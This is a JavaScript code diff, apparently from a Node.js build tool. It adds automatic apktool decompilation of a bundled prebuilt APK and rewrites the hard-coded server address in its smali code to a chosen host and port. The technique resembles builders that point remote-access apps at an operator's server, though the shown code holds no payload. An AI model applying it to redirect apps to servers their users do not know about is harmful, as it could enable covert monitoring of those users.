@@ -53,8 +53,44 @@ function getAndroidSdkPath() {
  * 检查是否可以使用ApkTool方案（无需Android SDK）
  */
 function canUseApkTool() {
-    return fs.existsSync(CONST.apkTool) && 
-           fs.existsSync(CONST.smaliPath);
+    return fs.existsSync(CONST.apkTool);
+}
+
+/**
+ * 重新反编译APK（确保decompiled目录是最新的）
+ * @param {function} callback - 回调函数
+ */
+function recompileAPK(callback) {
+    console.log('重新反编译APK...');
+    
+    // 删除旧的decompiled目录
+    if (fs.existsSync(CONST.smaliPath)) {
+        try {
+            fs.rmSync(CONST.smaliPath, { recursive: true, force: true });
+        } catch (e) {
+            console.log('删除旧目录警告:', e.message);
+        }
+    }
+    
+    // 找到源APK文件
+    const sourceApk = path.join(__dirname, '../app/factory/app-release.apk');
+    if (!fs.existsSync(sourceApk)) {
+        return callback('未找到源APK文件: ' + sourceApk);
+    }
+    
+    // 执行反编译
+    const apktoolCmd = `java -jar "${CONST.apkTool}" d -f -o "${CONST.smaliPath}" "${sourceApk}"`;
+    
+    cp.exec(apktoolCmd, { timeout: 120000 }, (error, stdout, stderr) => {
+        if (error) {
+            console.log('反编译输出:', stdout);
+            console.log('反编译错误:', stderr);
+            return callback('反编译APK失败: ' + error.message);
+        }
+        
+        console.log('APK反编译成功');
+        return callback(false);
+    });
 }
 
 /**
@@ -113,7 +149,51 @@ function patchApkTool(URI, PORT, callback) {
         targetFile = findSmaliWithServerUrl(smaliBasePath);
         
         if (!targetFile) {
-            return callback('未找到包含服务器地址的smali文件，请确保decompiled目录存在且包含有效的APK代码');
+            // 如果找不到，可能是decompiled目录损坏或不完整
+            // 重新反编译APK
+            return recompileAPK((err) => {
+                if (err) return callback(err);
+                
+                // 重新搜索
+                console.log('重新搜索smali文件...');
+                targetFile = findSmaliWithServerUrl(smaliBasePath);
+                
+                if (!targetFile) {
+                    return callback('重新反编译后仍未找到包含服务器地址的smali文件');
+                }
+                
+                // 继续处理
+                const content = fs.readFileSync(targetFile, 'utf8');
+                if (/const-string v\d+, "http:\/\/[^"]*"/.test(content)) {
+                    patchPattern = /const-string v\d+, "http:\/\/[^"]*"/;
+                    replacementMode = 'const-string';
+                }
+                
+                console.log('找到目标文件:', targetFile);
+                
+                fs.readFile(targetFile, 'utf8', function (err, data) {
+                    if (err) return callback('读取smali文件失败: ' + err.message);
+                    
+                    const serverUrl = `http://${URI}:${PORT}`;
+                    
+                    let result;
+                    if (replacementMode === 'const-string') {
+                        result = data.replace(patchPattern, `const-string v0, "${serverUrl}"`);
+                    } else {
+                        result = data.replace(patchPattern, serverUrl);
+                    }
+                    
+                    if (result === data) {
+                        return callback('未能在smali文件中找到服务器地址模式');
+                    }
+                    
+                    fs.writeFile(targetFile, result, 'utf8', function (err) {
+                        if (err) return callback('写入smali文件失败: ' + err.message);
+                        console.log('已修补smali文件:', targetFile);
+                        return callback(false);
+                    });
+                });
+            });
         }
         
         // 检查是否是const-string模式
